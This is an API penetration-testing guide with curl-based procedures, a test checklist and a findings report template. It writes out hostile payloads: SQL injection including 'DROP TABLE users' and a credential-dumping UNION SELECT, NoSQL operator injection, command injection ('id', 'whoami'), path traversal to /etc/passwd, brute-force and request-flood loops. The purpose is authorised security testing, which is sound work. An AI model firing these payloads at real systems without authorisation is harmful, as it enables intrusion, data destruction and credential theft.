# Specialized: API Penetration Testing Guide

## Overview
**Use Case:** Hands-on security testing of API endpoints  
**Use With:** Phase 3 (API Security) findings  
**Estimated Time:** 4-8 hours depending on API size

---

## Testing Approach

This guide provides structured testing procedures to validate findings from the API audit and discover additional vulnerabilities through active testing.

---

## Test Categories

### 1. Authentication Testing

#### 1.1 Credential Testing
```bash
# Test for default credentials
curl -X POST $API_URL/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "admin"}'

# Common default credentials to test:
# admin:admin, admin:password, admin:123456
# root:root, test:test, user:user
```

#### 1.2 Token Testing
```bash
# Test token without signature (JWT alg:none)
# Original token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
# Modified to alg:none with modified claims

# Test expired token acceptance
curl -X GET $API_URL/protected \
  -H "Authorization: Bearer <expired_token>"

# Test token reuse after logout
# 1. Login, get token
# 2. Logout
# 3. Try using same token
```

#### 1.3 Brute Force Testing
```bash
# Test for rate limiting on login
for i in {1..100}; do
  curl -s -X POST $API_URL/auth/login \
    -H "Content-Type: application/json" \
    -d '{"username": "admin", "password": "wrong'$i'"}'
done

# Check if account lockout triggers
```

### 2. Authorization Testing

#### 2.1 Horizontal Privilege Escalation (IDOR)
```bash
# As User A, try to access User B's resources
# If User A's ID is 1, try accessing ID 2, 3, etc.

curl -X GET $API_URL/users/2/profile \
  -H "Authorization: Bearer <user_a_token>"

curl -X GET $API_URL/orders/ORDER_ID_OF_USER_B \
  -H "Authorization: Bearer <user_a_token>"

# Try UUID enumeration
curl -X GET "$API_URL/documents/{uuid}" \
  -H "Authorization: Bearer <user_token>"
```

#### 2.2 Vertical Privilege Escalation
```bash
# As regular user, try admin endpoints
curl -X GET $API_URL/admin/users \
  -H "Authorization: Bearer <regular_user_token>"

curl -X POST $API_URL/admin/settings \
  -H "Authorization: Bearer <regular_user_token>" \
  -H "Content-Type: application/json" \
  -d '{"setting": "value"}'

# Try adding admin role via API
curl -X PUT $API_URL/users/me \
  -H "Authorization: Bearer <regular_user_token>" \
  -H "Content-Type: application/json" \
  -d '{"role": "admin"}'
```

#### 2.3 Function-Level Access Control
```bash
# Test HTTP method tampering
curl -X POST $API_URL/users/1 \  # If GET is protected, try POST
  -H "Authorization: Bearer <token>"

# Test case sensitivity
curl -X GET $API_URL/Admin/users \
  -H "Authorization: Bearer <token>"

curl -X GET $API_URL/USERS \
  -H "Authorization: Bearer <token>"
```

### 3. Injection Testing

#### 3.1 SQL Injection
```bash
# Test in query parameters
curl "$API_URL/users?id=1' OR '1'='1"
curl "$API_URL/users?id=1; DROP TABLE users--"
curl "$API_URL/search?q=' UNION SELECT username,password FROM users--"

# Test in JSON body
curl -X POST $API_URL/search \
  -H "Content-Type: application/json" \
  -d '{"query": "test'\'' OR 1=1--"}'

# Test in headers
curl -X GET $API_URL/resource \
  -H "X-User-Id: 1' OR '1'='1"
```

#### 3.2 NoSQL Injection
```bash
# MongoDB operator injection
curl -X POST $API_URL/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$gt": ""}, "password": {"$gt": ""}}'

curl -X GET "$API_URL/users?username[$ne]=admin"

# Test $where injection
curl -X POST $API_URL/search \
  -H "Content-Type: application/json" \
  -d '{"$where": "this.password.length > 0"}'
```

#### 3.3 Command Injection
```bash
# Test in parameters that might execute commands
curl "$API_URL/ping?host=127.0.0.1;id"
curl "$API_URL/convert?file=test.pdf|whoami"
curl "$API_URL/backup?name=backup\`id\`"
```

### 4. Input Validation Testing

#### 4.1 Boundary Testing
```bash
# Integer overflow
curl -X POST $API_URL/transfer \
  -H "Content-Type: application/json" \
  -d '{"amount": 9999999999999999999}'

# Negative values
curl -X POST $API_URL/transfer \
  -H "Content-Type: application/json" \
  -d '{"amount": -100}'

# String length
curl -X POST $API_URL/users \
  -H "Content-Type: application/json" \
  -d '{"name": "'$(python3 -c "print('A'*100000)")'"}'
```

#### 4.2 Type Confusion
```bash
# Send array instead of string
curl -X POST $API_URL/users \
  -H "Content-Type: application/json" \
  -d '{"name": ["test"]}'

# Send object instead of string
curl -X POST $API_URL/users \
  -H "Content-Type: application/json" \
  -d '{"name": {"test": "value"}}'

# Send null
curl -X POST $API_URL/users \
  -H "Content-Type: application/json" \
  -d '{"name": null}'
```

#### 4.3 Special Characters
```bash
# Test special characters in various fields
PAYLOADS='<script>alert(1)</script>
${7*7}
{{7*7}}
%00
%0d%0a
\r\n
..\..\..\..\etc\passwd
....//....//etc/passwd'

for payload in $PAYLOADS; do
  curl -X POST $API_URL/resource \
    -H "Content-Type: application/json" \
    -d "{\"field\": \"$payload\"}"
done
```

### 5. Rate Limiting & DoS Testing

#### 5.1 Rate Limit Testing
```bash
# Rapid requests to test rate limiting
for i in {1..200}; do
  curl -s -o /dev/null -w "%{http_code}\n" \
    "$API_URL/endpoint" &
done
wait

# Test rate limit bypass via headers
curl -X GET $API_URL/endpoint \
  -H "X-Forwarded-For: 1.2.3.4"

curl -X GET $API_URL/endpoint \
  -H "X-Real-IP: 1.2.3.5"
```

#### 5.2 Resource Exhaustion
```bash
# Large payload
curl -X POST $API_URL/upload \
  -H "Content-Type: application/json" \
  -d '{"data": "'$(python3 -c "print('A'*10000000)")'"}'

# Deep JSON nesting
python3 -c "
import json
data = {'a': None}
current = data
for i in range(1000):
    current['a'] = {'a': None}
    current = current['a']
print(json.dumps(data))
" | curl -X POST $API_URL/endpoint \
  -H "Content-Type: application/json" \
  -d @-
```

### 6. Information Disclosure Testing

#### 6.1 Error Message Testing
```bash
# Trigger various errors and check responses
curl "$API_URL/nonexistent"
curl "$API_URL/users/999999999"
curl -X POST $API_URL/resource \
  -H "Content-Type: application/json" \
  -d 'invalid json'
curl -X POST $API_URL/resource \
  -H "Content-Type: application/xml" \
  -d '<invalid>'
```

#### 6.2 Debug Endpoints
```bash
# Test common debug/admin endpoints
ENDPOINTS="/debug /admin /test /swagger /api-docs 
/actuator /health /metrics /env /config
/.env /config.json /settings"

for endpoint in $ENDPOINTS; do
  echo "Testing: $endpoint"
  curl -s -o /dev/null -w "%{http_code}" "$API_URL$endpoint"
done
```

### 7. CORS & Header Testing

```bash
# Test CORS configuration
curl -X OPTIONS $API_URL/resource \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: GET" \
  -v

# Check response headers
curl -s -D - $API_URL/resource -o /dev/null | grep -E \
  "Access-Control-Allow-Origin|X-Frame-Options|Content-Security-Policy"
```

---

## Testing Checklist

```markdown
## API Security Test Checklist

### Authentication
- [ ] Default credentials tested
- [ ] Token validation tested
- [ ] Token expiration tested
- [ ] Session management tested
- [ ] Brute force protection tested
- [ ] Password reset tested

### Authorization
- [ ] IDOR/horizontal escalation tested
- [ ] Vertical escalation tested
- [ ] Method tampering tested
- [ ] Admin endpoints tested from user context

### Injection
- [ ] SQL injection tested
- [ ] NoSQL injection tested
- [ ] Command injection tested
- [ ] LDAP injection tested (if applicable)

### Input Validation
- [ ] Boundary values tested
- [ ] Type confusion tested
- [ ] Special characters tested
- [ ] Large payloads tested

### Rate Limiting
- [ ] Rate limits exist
- [ ] Rate limits cannot be bypassed
- [ ] Resource exhaustion tested

### Information Disclosure
- [ ] Error messages reviewed
- [ ] Debug endpoints checked
- [ ] Response headers checked

### Business Logic
- [ ] Business rule bypass tested
- [ ] Race conditions tested
- [ ] State manipulation tested
```

---

## Reporting Template

```markdown
### Finding: [Title]

**Endpoint:** [METHOD] /path
**Severity:** Critical/High/Medium/Low

**Description:**
[What the vulnerability is]

**Steps to Reproduce:**
1. [Step 1]
2. [Step 2]
3. [Step 3]

**Proof of Concept:**
```bash
curl -X POST $API_URL/vulnerable/endpoint \
  -H "Authorization: Bearer <token>" \
  -d '{"payload": "..."}'
```

**Response:**
```json
{
  "result": "..."
}
```

**Impact:**
[What an attacker could achieve]

**Recommendation:**
[How to fix]
```

---

## Tools Reference

```bash
# Useful tools for API testing
# (ensure these work in air-gapped environment)

# curl - HTTP requests
# jq - JSON processing
# httpie - Alternative to curl
# sqlmap - SQL injection testing
# ffuf - Fuzzing
# nuclei - Vulnerability scanning
```
